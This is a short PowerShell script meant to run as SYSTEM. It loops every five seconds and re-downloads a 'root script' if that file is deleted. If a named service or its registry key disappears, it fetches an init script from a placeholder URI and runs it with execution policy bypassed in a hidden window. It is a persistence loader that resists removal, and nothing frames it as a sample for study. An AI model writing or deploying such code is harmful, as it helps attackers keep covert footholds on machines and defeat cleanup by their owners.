#script must run as admin/SYSTEM
$serviceName = "MyService" # change this to the name of the service
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$rootPath = "path\to\root_script.ps1"
$initServicePath = "path\to\init_service.ps1"

function Check-ServiceReg{
    $c = Get-Item -Path $regPath -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    try {
        $d = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg
    $serv = Check-Service

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        iwr -uri "ROOT_SCRIPT_URI" -OutFile $rootPath
    }
    
    if($regS -or $serv){
        iwr -uri "INTI_SERVICE_URI" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath
    }
    Start-Sleep -Seconds 5
}